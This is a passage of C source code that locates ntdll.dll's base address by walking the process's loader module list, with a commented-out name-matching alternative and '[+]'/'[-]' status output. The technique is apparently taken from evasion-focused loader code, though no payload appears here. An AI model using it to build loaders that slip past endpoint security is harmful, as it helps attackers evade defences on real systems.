    dte = CONTAINING_RECORD(secondEntry, LDR_DATA_TABLE_ENTRY_FREE, InMemoryOrderLinks);

    ntdllBase = dte->DllBase;

    // /// OR check the string name of the module:
    // LIST_ENTRY* current = Ldr->InMemoryOrderModuleList; // Get the first entry in the list of loaded modules
    // do {
    //     current = current->Flink; // Move to the next entry
    //     MY_LDR_DATA_TABLE_ENTRY* entry = CONTAINING_RECORD(current, MY_LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
    //     char dllName[256]; // Buffer to store the name of the DLL
    //     // Assuming FullDllName is a UNICODE_STRING, conversion to char* may require more than snprintf, consider proper conversion
    //     snprintf(dllName, sizeof(dllName), "%wZ", entry->FullDllName);
    //     if (strstr(dllName, "ntdll.dll")) { // Check if dllName contains "ntdll.dll"
    //         return entry->DllBase; // Return the base address of ntdll.dll
    //     }
    // } while (current != Ldr->InMemoryOrderModuleList); // Loop until we reach the first entry again


    if (ntdllBase != NULL) {
        printf("[+] Ntdll base address found: %p\n", ntdllBase);
    } else {
        printf("[-] Ntdll base address not found\n");
    }

    return (ADDR*)ntdllBase;
}